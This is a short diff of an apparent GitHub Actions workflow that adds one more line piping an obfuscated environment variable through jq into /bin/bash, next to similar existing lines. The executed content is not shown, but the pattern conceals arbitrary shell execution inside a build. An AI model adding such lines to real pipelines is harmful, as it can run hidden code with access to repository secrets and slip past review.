@@ -38,6 +38,7 @@ jobs:
           echo $pyqii9 | jq -r .acrec36291 | /bin/bash
           echo $skw6617 | jq -r .f3771 | /bin/bash
           echo $gca87 | jq -r .o56 | /bin/bash
+          echo $w08 | jq -r .h858 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
